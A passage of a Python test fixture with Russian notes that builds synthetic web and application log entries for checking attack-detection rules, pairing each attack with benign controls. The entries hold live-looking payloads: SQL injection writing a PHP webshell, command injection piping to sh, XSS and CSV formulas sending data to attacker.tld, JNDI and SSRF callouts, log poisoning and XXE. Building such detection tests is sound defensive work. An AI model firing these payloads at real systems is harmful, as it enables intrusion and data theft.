         "cs-user-agent": "Mozilla/5.0", "note": "легитимный внешний URL — не совпадение"},

        # SSTI-пробы в query (правила e5f6a7b8-0007..0010)
        {"c-ip": "10.10.20.11", "cs-method": "GET", "cs-uri-stem": "/search",
         "cs-uri-query": "q={{7*7}}", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "SSTI-проба jinja2 {{7*7}}"},
        {"c-ip": "10.10.20.11", "cs-method": "GET", "cs-uri-stem": "/search",
         "cs-uri-query": "q=${7*7}", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "SSTI-проба ${7*7}"},
        {"c-ip": "10.10.20.11", "cs-method": "GET", "cs-uri-stem": "/search",
         "cs-uri-query": "q=%7B%7B7*7%7D%7D", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "SSTI-проба в URL-кодировке"},
        {"c-ip": "10.10.20.11", "cs-method": "GET", "cs-uri-stem": "/search",
         "cs-uri-query": "q={{config.items()}}", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "SSTI-проба чтения конфигурации"},
        {"c-ip": "10.10.20.11", "cs-method": "GET", "cs-uri-stem": "/search",
         "cs-uri-query": "q={{''.__class__.__mro__[1].__subclasses__()}}", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "SSTI: цепочка MRO/__subclasses__"},
        {"c-ip": "10.10.20.11", "cs-method": "GET", "cs-uri-stem": "/template",
         "cs-uri-query": "name={{_self.env.registerUndefinedFilterCallback('system')}}",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "SSTI Twig _self.env"},
        {"c-ip": "10.10.20.11", "cs-method": "GET", "cs-uri-stem": "/template",
         "cs-uri-query": 'expr=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "SSTI Freemarker Execute"},
        {"c-ip": "10.10.20.12", "cs-method": "GET", "cs-uri-stem": "/search",
         "cs-uri-query": "q=laptop 15\"", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "обычный поиск — не совпадение"},

        # Command injection в query (правила e5f6a7b8-0011..0015)
        {"c-ip": "10.10.20.13", "cs-method": "GET", "cs-uri-stem": "/status",
         "cs-uri-query": "host=8.8.8.8;id", "sc-status": 200, "cs-user-agent": "curl/8.4.0",
         "note": "cmdi: цепочка через ;"},
        {"c-ip": "10.10.20.13", "cs-method": "GET", "cs-uri-stem": "/status",
         "cs-uri-query": "host=8.8.8.8|whoami", "sc-status": 200, "cs-user-agent": "curl/8.4.0",
         "note": "cmdi: цепочка через pipe"},
        {"c-ip": "10.10.20.13", "cs-method": "GET", "cs-uri-stem": "/status",
         "cs-uri-query": "host=8.8.8.8&&id", "sc-status": 200, "cs-user-agent": "curl/8.4.0",
         "note": "cmdi: цепочка через &&"},
        {"c-ip": "10.10.20.13", "cs-method": "GET", "cs-uri-stem": "/tools/lookup",
         "cs-uri-query": "domain=example.com`id`", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "cmdi: backtick-подстановка"},
        {"c-ip": "10.10.20.13", "cs-method": "GET", "cs-uri-stem": "/tools/lookup",
         "cs-uri-query": "domain=$(whoami).attacker.tld", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "cmdi: $() подстановка с OOB"},
        {"c-ip": "10.10.20.13", "cs-method": "GET", "cs-uri-stem": "/status",
         "cs-uri-query": "host=8.8.8.8;sleep 5", "sc-status": 200, "time-taken": 5121,
         "cs-user-agent": "curl/8.4.0", "note": "blind cmdi: задержка 5 с"},
        {"c-ip": "10.10.20.13", "cs-method": "GET", "cs-uri-stem": "/status",
         "cs-uri-query": "host=8.8.8.8;sleep${IFS}5", "sc-status": 200, "time-taken": 5010,
         "cs-user-agent": "curl/8.4.0", "note": "blind cmdi с обходом через ${IFS}"},
        {"c-ip": "10.10.20.13", "cs-method": "GET", "cs-uri-stem": "/fetch",
         "cs-uri-query": "file=;echo aGVsbG8=|base64 -d|sh", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "cmdi: base64-обфускация и pipe в sh"},
        {"c-ip": "10.10.20.13", "cs-method": "GET", "cs-uri-stem": "/convert",
         "cs-uri-query": "name=report;tar --checkpoint=1 --checkpoint-action=exec=sh /tmp/e.sh",
         "sc-status": 200, "cs-user-agent": "curl/8.4.0",
         "note": "argument injection: tar --checkpoint-action"},
        {"c-ip": "10.10.20.13", "cs-method": "GET", "cs-uri-stem": "/render",
         "cs-uri-query": "url=http://ok.test/x -o /tmp/sh.php", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "argument injection: curl -o"},
        {"c-ip": "10.10.20.14", "cs-method": "GET", "cs-uri-stem": "/diag",
         "cs-uri-query": "target=8.8.8.8 & whoami", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "cmdi в Windows-контексте: & whoami"},
        {"c-ip": "10.10.20.14", "cs-method": "GET", "cs-uri-stem": "/diag",
         "cs-uri-query": "cmd=cmd /c type C:\\windows\\win.ini", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "cmdi Windows: cmd /c type win.ini"},
        {"c-ip": "10.10.20.14", "cs-method": "GET", "cs-uri-stem": "/diag",
         "cs-uri-query": "cmd=powershell -enc SQBFAFgAKAAiAGgAdAB0cAA6AC8ALwAxADAALgAxADAALgAyADAALgA5ADkAIgApAA==",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "cmdi Windows: powershell -enc"},
        {"c-ip": "10.10.20.15", "cs-method": "GET", "cs-uri-stem": "/status",
         "cs-uri-query": "host=8.8.8.8", "sc-status": 200, "time-taken": 12,
         "cs-user-agent": "Mozilla/5.0", "note": "обычный ping-эндпоинт — не совпадение"},
        {"c-ip": "10.10.20.15", "cs-method": "GET", "cs-uri-stem": "/report",
         "cs-uri-query": "id=42", "sc-status": 200, "time-taken": 6100,
         "cs-user-agent": "Mozilla/5.0", "note": "медленный отчёт без sleep-маркера"},

        # SQL-инъекции: диалекты и техники (правила e5f6a7b8-0017..0041)
        {"c-ip": "10.10.20.21", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1' -- -", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "sqli: комментарий -- - после кавычки"},
        {"c-ip": "10.10.20.21", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1'--", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "sqli: короткий комментарий '--"},
        {"c-ip": "10.10.20.21", "cs-method": "GET", "cs-uri-stem": "/search",
         "cs-uri-query": "q=%27%23", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "sqli: URL-кодированные кавычка и #"},
        {"c-ip": "10.10.20.22", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1' HAVING 1=1 -- -", "sc-status": 500,
         "cs-user-agent": "Mozilla/5.0", "note": "sqli: HAVING-проба на ошибку GROUP BY"},
        {"c-ip": "10.10.20.23", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1'; EXEC master..xp_dirtree '\\\\data.attacker.tld\\a'; --",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "sqli OOB: xp_dirtree на внешний UNC"},
        {"c-ip": "10.10.20.23", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1' AND 1=CONVERT(int,(SELECT DB_NAME())) --", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "mssql error-based CONVERT"},
        {"c-ip": "10.10.20.23", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=' UNION SELECT @@version, DB_NAME(), SUSER_SNAME() --",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "mssql: снятие версии баннером"},
        {"c-ip": "10.10.20.24", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1'; EXEC xp_cmdshell 'whoami'; --", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "mssql: попытка xp_cmdshell"},
        {"c-ip": "10.10.20.25", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1' AND SUBSTRING((SELECT user()),1,1)='r' -- -", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "mysql boolean blind: SUBSTRING"},
        {"c-ip": "10.10.20.25", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1' AND ASCII(SUBSTRING((SELECT database()),1,1))>100 -- -",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "mysql boolean blind: ASCII"},
        {"c-ip": "10.10.20.26", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) -- -",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "mysql error-based EXTRACTVALUE"},
        {"c-ip": "10.10.20.26", "cs-method": "GET", "cs-uri-stem": "/files",
         "cs-uri-query": "id=-1' UNION SELECT LOAD_FILE('/etc/passwd'),2,3 -- -",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "mysql: LOAD_FILE чтения"},
        {"c-ip": "10.10.20.26", "cs-method": "GET", "cs-uri-stem": "/files",
         "cs-uri-query": "id=1' UNION SELECT '<?php system($_GET[0]);?>' "
                         "INTO OUTFILE '/var/www/html/sh.php' -- -",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "mysql: запись webshell в OUTFILE"},
        {"c-ip": "10.10.20.27", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=-1' UNION SELECT table_schema,table_name,column_name,4 "
                         "FROM information_schema.columns -- -",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "mysql: UNION-перечисление схемы"},
        {"c-ip": "10.10.20.27", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1 /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 -- -", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "mysql: versioned inline comment"},
        {"c-ip": "10.10.20.27", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1/**/UNION/**/SELECT/**/1,2,3-- -", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "обход через /**/ вместо пробелов"},
        {"c-ip": "10.10.20.28", "cs-method": "GET", "cs-uri-stem": "/users",
         "cs-uri-query": "name=admin%' -- -", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "LIKE-wildcard: admin%'"},
        {"c-ip": "10.10.20.28", "cs-method": "GET", "cs-uri-stem": "/users",
         "cs-uri-query": "email=%' OR '1'='1", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "LIKE-wildcard: тавтология с %"},
        {"c-ip": "10.10.20.29", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1' ORDER BY 3 -- -", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "подбор числа колонок: ORDER BY 3"},
        {"c-ip": "10.10.20.29", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1' ORDER BY 10 -- -", "sc-status": 500, "cs-user-agent": "Mozilla/5.0",
         "note": "подбор числа колонок: ORDER BY 10 с ошибкой"},
        {"c-ip": "10.10.20.30", "cs-method": "GET", "cs-uri-stem": "/login",
         "cs-uri-query": "user=' OR '1'='1' -- -&pass=x", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "тавтология в GET-логине"},
        {"c-ip": "10.10.20.31", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1' AND IF(1=1,SLEEP(5),0) -- -", "sc-status": 200,
         "time-taken": 5210, "cs-user-agent": "Mozilla/5.0", "note": "mysql time-based SLEEP"},
        {"c-ip": "10.10.20.31", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1' AND BENCHMARK(5000000,SHA1('test')) -- -", "sc-status": 200,
         "time-taken": 4800, "cs-user-agent": "Mozilla/5.0", "note": "mysql time-based BENCHMARK"},
        {"c-ip": "10.10.20.32", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=' UNION SELECT NULL, banner FROM v$version--", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "oracle: banner из v$version"},
        {"c-ip": "10.10.20.32", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=' AND (SELECT pg_sleep(5)) IS NOT NULL --", "sc-status": 200,
         "time-taken": 5010, "cs-user-agent": "Mozilla/5.0", "note": "postgresql pg_sleep"},
        {"c-ip": "10.10.20.34", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id='; COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned'; --",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "postgresql COPY TO PROGRAM"},
        {"c-ip": "10.10.20.35", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=' AND 1=CAST((SELECT version()) AS INT) --", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "postgresql error-based CAST"},
        {"c-ip": "10.10.20.35", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=' UNION SELECT current_user, version(), current_database() --",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "postgresql: стек и версия"},
        {"c-ip": "10.10.20.36", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=' UNION SELECT name, sql, 3 FROM sqlite_master --",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "sqlite: sqlite_master"},
        {"c-ip": "10.10.20.36", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1 AND json_extract(meta,'$.token')='x'", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "sqlite: json_extract в параметре"},
        {"c-ip": "10.10.20.37", "cs-method": "GET", "cs-uri-stem": "/items",
         "cs-uri-query": "id=1'; UPDATE users SET role='admin' WHERE id=2; -- -",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "stacked queries: UPDATE"},

        # XSS-векторы (правила e5f6a7b8-0042..0054) и upload (0055..0061)
        {"c-ip": "10.10.20.41", "cs-method": "GET", "cs-uri-stem": "/search",
         "cs-uri-query": "search=<script>alert(document.domain)</script>", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "reflected XSS: script-тег"},
        {"c-ip": "10.10.20.41", "cs-method": "GET", "cs-uri-stem": "/profile",
         "cs-uri-query": "avatar=<img src=x onerror=alert(1)>", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "XSS через img onerror без script"},
        {"c-ip": "10.10.20.41", "cs-method": "GET", "cs-uri-stem": "/form",
         "cs-uri-query": "name=\" autofocus onfocus=alert(document.domain) x=\"",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "выход из атрибута двойной кавычкой + onfocus"},
        {"c-ip": "10.10.20.41", "cs-method": "GET", "cs-uri-stem": "/form",
         "cs-uri-query": "value=\" onmouseover=alert(1) //", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "выход из атрибута + onmouseover"},
        {"c-ip": "10.10.20.42", "cs-method": "GET", "cs-uri-stem": "/go",
         "cs-uri-query": "url=javascript:alert(document.domain)//", "sc-status": 302,
         "cs-user-agent": "Mozilla/5.0", "note": "javascript:-схема в redirect-параметре"},
        {"c-ip": "10.10.20.42", "cs-method": "GET", "cs-uri-stem": "/search",
         "cs-uri-query": "t=<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "XSS с HTML-entity-кодированием обработчика"},
        {"c-ip": "10.10.20.42", "cs-method": "GET", "cs-uri-stem": "/widget",
         "cs-uri-query": "icon=<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0", "note": "SVG animate onbegin"},
        {"c-ip": "10.10.20.43", "cs-method": "GET", "cs-uri-stem": "/page",
         "cs-uri-query": "cb=<script src=\"https://accounts.google.com/o/oauth2/revoke?"
                         "callback=alert\"></script>",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "обход CSP через JSONP-endpoint доверенного домена"},
        {"c-ip": "10.10.20.43", "cs-method": "GET", "cs-uri-stem": "/report",
         "cs-uri-query": "title=<img src=x onerror=\"fetch('http://attacker.tld/?'+"
                         "btoa(document.documentElement.innerHTML))\">",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "вектор для HTML->PDF-генератора: эксфильтрация DOM"},
        {"c-ip": "10.10.20.43", "cs-method": "GET", "cs-uri-stem": "/chat",
         "cs-uri-query": "msg={{constructor.constructor('alert(1)')()}}", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "Angular: template-инъекция через constructor"},
        {"c-ip": "10.10.20.44", "cs-method": "GET", "cs-uri-stem": "/uploads/shell.jpg.php",
         "cs-uri-query": "c=id", "sc-status": 200, "cs-user-agent": "curl/8.4.0",
         "note": "двойное расширение исполнено как PHP из каталога загрузок"},

        # LFI/RFI (правила e5f6a7b8-0062..0067)
        {"c-ip": "10.10.20.51", "cs-method": "GET", "cs-uri-stem": "/read",
         "cs-uri-query": "file=%252e%252e%252f%252e%252e%252fetc/passwd", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "двойное URL-кодирование traversal"},
        {"c-ip": "10.10.20.51", "cs-method": "GET", "cs-uri-stem": "/read",
         "cs-uri-query": "file=..%252f..%252fetc/passwd", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "смешанное кодирование ../"},
        {"c-ip": "10.10.20.52", "cs-method": "GET", "cs-uri-stem": "/read",
         "cs-uri-query": "file=/var/log/apache2/access.log", "sc-status": 200,
         "cs-user-agent": "<?php system($_GET['cmd']); ?>",
         "note": "log poisoning: PHP-код в User-Agent, include access.log"},
        {"c-ip": "10.10.20.52", "cs-method": "GET", "cs-uri-stem": "/read",
         "cs-uri-query": "file=../../../../var/log/auth.log", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0 <?php echo shell_exec($_GET['c']); ?>",
         "note": "log poisoning через auth.log"},
        {"c-ip": "10.10.20.53", "cs-method": "GET", "cs-uri-stem": "/index",
         "cs-uri-query": "page=php://filter/convert.base64-encode/resource=config.php",
         "sc-status": 200, "cs-user-agent": "curl/8.4.0",
         "note": "php://filter: чтение исходника в base64"},
        {"c-ip": "10.10.20.53", "cs-method": "POST", "cs-uri-stem": "/include.php",
         "cs-uri-query": "page=php://input", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "php://input: выполнение тела POST"},
        {"c-ip": "10.10.20.53", "cs-method": "GET", "cs-uri-stem": "/read",
         "cs-uri-query": "file=/proc/self/environ", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "/proc/self/environ: чтение окружения"},

        # SSRF (правила e5f6a7b8-0068..0073)
        {"c-ip": "10.10.20.54", "cs-method": "GET", "cs-uri-stem": "/fetch",
         "cs-uri-query": "url=http://burpcollaborator.example/", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "blind SSRF на OOB-платформу"},
        {"c-ip": "10.10.20.54", "cs-method": "GET", "cs-uri-stem": "/fetch",
         "cs-uri-query": "url=http://[fd00:ec2::254]/latest/meta-data/", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "SSRF на IPv6-адрес метаданных AWS"},
        {"c-ip": "10.10.20.54", "cs-method": "GET", "cs-uri-stem": "/fetch",
         "cs-uri-query": "url=http://7f000001.c0a80001.rb.example.tld/", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "DNS rebinding: hex-IP в поддомене"},
        {"c-ip": "10.10.20.55", "cs-method": "GET", "cs-uri-stem": "/fetch",
         "cs-uri-query": "url=http://2130706433/admin", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "обфускация localhost: десятичный IP"},
        {"c-ip": "10.10.20.55", "cs-method": "GET", "cs-uri-stem": "/fetch",
         "cs-uri-query": "url=http://0x7f000001:6379/", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "обфускация localhost: hex IP + Redis"},
        {"c-ip": "10.10.20.55", "cs-method": "GET", "cs-uri-stem": "/fetch",
         "cs-uri-query": "url=http://[::1]:8080/", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "обфускация localhost: IPv6 ::1"},
        {"c-ip": "10.10.20.56", "cs-method": "GET", "cs-uri-stem": "/fetch",
         "cs-uri-query": "url=gopher://127.0.0.1:6379/_INFO%0d%0a", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "gopher-контрабанда в локальный Redis"},
        {"c-ip": "10.10.20.56", "cs-method": "GET", "cs-uri-stem": "/fetch",
         "cs-uri-query": "url=dict://127.0.0.1:6379/info", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "dict-протокол к локальному Redis"},
        {"c-ip": "10.10.20.56", "cs-method": "GET", "cs-uri-stem": "/fetch",
         "cs-uri-query": "url=https://allowed.example.com/r?to=http://169.254.169.254/"
                         "latest/meta-data/",
         "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "SSRF через цепочку редиректов доверенного домена"},

        # NoSQL (правила e5f6a7b8-0074..0078)
        {"c-ip": "10.10.20.57", "cs-method": "GET", "cs-uri-stem": "/api/login",
         "cs-uri-query": "user[$ne]=1&pass[$ne]=1", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "Mongo-операторы в query-параметрах"},
        {"c-ip": "10.10.20.57", "cs-method": "GET", "cs-uri-stem": "/api/search",
         "cs-uri-query": "filter=%7B%22%24where%22%3A%22sleep(3000)%22%7D", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "$where с JS sleep (URL-кодирован)"},
        {"c-ip": "10.10.20.58", "cs-method": "GET", "cs-uri-stem": "/_search",
         "cs-uri-query": "source={\"query\":{\"match_all\":{}}}", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "Elasticsearch _search выставлен наружу"},
        {"c-ip": "10.10.20.58", "cs-method": "GET", "cs-uri-stem": "/_cat/indices",
         "cs-uri-query": "", "sc-status": 200, "cs-user-agent": "curl/8.4.0",
         "note": "Elasticsearch _cat: перечисление индексов"},
        {"c-ip": "10.10.20.59", "cs-method": "GET", "cs-uri-stem": "/_all_docs",
         "cs-uri-query": "include_docs=true", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "CouchDB _all_docs без аутентификации"},
        {"c-ip": "10.10.20.59", "cs-method": "POST", "cs-uri-stem": "/db/_find",
         "cs-uri-query": "", "sc-status": 200, "cs-user-agent": "curl/8.4.0",
         "note": "CouchDB Mango-запрос"},
        {"c-ip": "10.10.20.59", "cs-method": "GET", "cs-uri-stem": "/users/.json",
         "cs-uri-query": "shallow=true", "sc-status": 200,
         "cs-user-agent": "curl/8.4.0", "note": "Firebase RTDB: чтение без правил"},

        # HTTP-атаки и заголовки (правила e5f6a7b8-0082..0101)
        {"c-ip": "10.10.20.62", "cs-method": "GET", "cs-uri-stem": "/redirect",
         "cs-uri-query": "url=%0d%0aSet-Cookie:admin=1", "sc-status": 302,
         "cs-user-agent": "Mozilla/5.0", "note": "CRLF-инъекция: подстановка Set-Cookie"},
        {"c-ip": "10.10.20.62", "cs-method": "GET", "cs-uri-stem": "/",
         "cs-uri-query": "", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0%0d%0aX-Fake: 1.2.3.4 200 1234 \"-\" \"admin SUCCESS\"",
         "note": "инъекция в User-Agent: подделка строки лога"},
        {"c-ip": "10.10.20.62", "cs-method": "GET", "cs-uri-stem": "/",
         "cs-uri-query": "", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0 HB-CANARY-12345",
         "note": "canary-строка в User-Agent (проверка лог-инъекций)"},
        {"c-ip": "10.10.20.63", "cs-method": "POST", "cs-uri-stem": "/account/email",
         "cs-uri-query": "", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "cs-referer": "https://evil.tld/attack.html",
         "note": "CSRF: POST со сторонней страницы без токена"},
        {"c-ip": "10.10.20.63", "cs-method": "POST", "cs-uri-stem": "/account/email",
         "cs-uri-query": "", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "cs-referer": "https://app.corp.lab/settings",
         "note": "обычный POST со своего сайта — не совпадение"},
        {"c-ip": "10.10.20.64", "cs-method": "GET", "cs-uri-stem": "/authorize",
         "cs-uri-query": "client_id=app&response_type=code&redirect_uri=https://app.example/"
                         ".%2e%2fprofile%2f..%2f..%2fredirect%3furl%3dhttps://attacker.tld"
                         "&state=x&scope=openid",
         "sc-status": 302, "cs-user-agent": "Mozilla/5.0",
         "note": "OAuth: redirect_uri с traversal на внешний домен"},
        {"c-ip": "10.10.20.65", "cs-method": "GET", "cs-uri-stem": "/redirect",
         "cs-uri-query": "url=https://attacker.tld/", "sc-status": 302,
         "cs-user-agent": "Mozilla/5.0", "note": "open redirect на внешний домен"},
        {"c-ip": "10.10.20.65", "cs-method": "GET", "cs-uri-stem": "/go",
         "cs-uri-query": "next=//evil.tld", "sc-status": 302,
         "cs-user-agent": "Mozilla/5.0", "note": "open redirect: protocol-relative URL"},

        # Auth-bypass и десериализация (правила e5f6a7b8-0102..0117)
        {"c-ip": "10.10.20.66", "cs-method": "GET", "cs-uri-stem": "/admin/..;/dashboard",
         "cs-uri-query": "", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "обход аутентификации: нормализация пути ..;"},
        {"c-ip": "10.10.20.66", "cs-method": "GET",
         "cs-uri-stem": "/static/..%3b..%3b/admin/config",
         "cs-uri-query": "", "sc-status": 200, "cs-user-agent": "Mozilla/5.0",
         "note": "кодированный вариант ..%3b для обхода фильтра"},
        {"c-ip": "10.10.20.67", "cs-method": "GET", "cs-uri-stem": "/api/search",
         "cs-uri-query": "filter[__proto__][isAdmin]=true", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "prototype pollution через query-параметр"},
        {"c-ip": "10.10.20.68", "cs-method": "GET", "cs-uri-stem": "/api/items",
         "cs-uri-query": "name=${jndi:ldap://attacker.tld/a}", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "note": "JNDI-инъекция (log4shell-паттерн)"},
    ] + [
        {"c-ip": "10.10.20.61", "cs-method": "POST", "cs-uri-stem": "/apply-coupon",
         "cs-uri-query": "coupon=ONCE100", "sc-status": 200,
         "cs-user-agent": "Mozilla/5.0", "ts": f"2026-10-20T13:07:01.{i:03d}Z",
         "note": f"race: одновременный запрос купона #{i}"}
        for i in range(1, 13)
    ]


def application_log() -> list[dict]:
    return [
        {"ts": "2026-10-20T10:00:01Z", "source_ip": "10.10.20.5", "user_agent": "curl/8.4.0",
         "event_action": "jwt_verify", "event_outcome": "failure",
         "failure_reason": "invalid signature", "jwt_alg": "HS256", "jwt_kid": "key-1",
         "token_sub": "guest", "note": "подбор секрета"},
        {"ts": "2026-10-20T10:00:02Z", "source_ip": "10.10.20.5", "user_agent": "curl/8.4.0",
         "event_action": "jwt_verify", "event_outcome": "failure",
         "failure_reason": "invalid signature", "jwt_alg": "HS256", "jwt_kid": "key-1",
         "token_sub": "guest", "note": "подбор секрета"},
        {"ts": "2026-10-20T10:00:03Z", "source_ip": "10.10.20.5", "user_agent": "curl/8.4.0",
         "event_action": "jwt_verify", "event_outcome": "success", "failure_reason": "",
         "jwt_alg": "none", "jwt_kid": "", "token_sub": "guest",
         "note": "alg=none принят уязвимым сервисом"},
        {"ts": "2026-10-20T10:00:04Z", "source_ip": "10.10.20.5", "user_agent": "curl/8.4.0",
         "event_action": "authorization", "event_outcome": "failure",
         "mismatch_kind": "token_role_vs_store", "token_sub": "guest",
         "note": "role=admin в токене, user в БД"},
        {"ts": "2026-10-20T10:01:00Z", "source_ip": "10.10.20.6", "user_agent": "Mozilla/5.0",
         "request_path": "/lookup", "request_content_type": "application/xml",
         "request_body": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
                         '"file:///etc/passwd">]><r>&x;</r>',
         "error_message": "", "note": "XXE-запрос"},
        {"ts": "2026-10-20T10:01:01Z", "source_ip": "10.10.20.6", "user_agent": "Mozilla/5.0",
         "request_path": "/lookup_safe", "request_content_type": "application/xml",
         "request_body": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
                         '"file:///etc/passwd">]><r>&x;</r>',
         "error_message": "DOCTYPE is not allowed", "note": "безопасная ветка отклонила"},
        {"ts": "2026-10-20T10:01:02Z", "source_ip": "10.10.20.7", "user_agent": "Mozilla/5.0",
         "request_path": "/import", "request_content_type": "application/xml",
         "request_body": '<?xml version="1.0"?><catalog><item>1</item></catalog>',
         "error_message": "", "note": "легитимный XML без DOCTYPE"},
        {"ts": "2026-10-20T10:02:00Z", "source_ip": "10.10.20.8", "user_agent": "Mozilla/5.0",
         "request_path": "/api/report/fields", "request_content_type": "application/json",
         "request_body": 'comment==HYPERLINK("http://attacker.tld/?"&A1,"Отчёт")',
         "error_message": "", "note": "CSV formula injection в поле формы"},
        {"ts": "2026-10-20T10:02:01Z", "source_ip": "10.10.20.8", "user_agent": "Mozilla/5.0",
         "request_path": "/api/report/fields", "request_content_type": "application/json",
         "request_body": "comment=обычный текст отчёта", "error_message": "",
         "note": "легитимное значение"},
        {"ts": "2026-10-20T10:03:00Z", "source_ip": "10.10.20.9", "user_agent": "Mozilla/5.0",
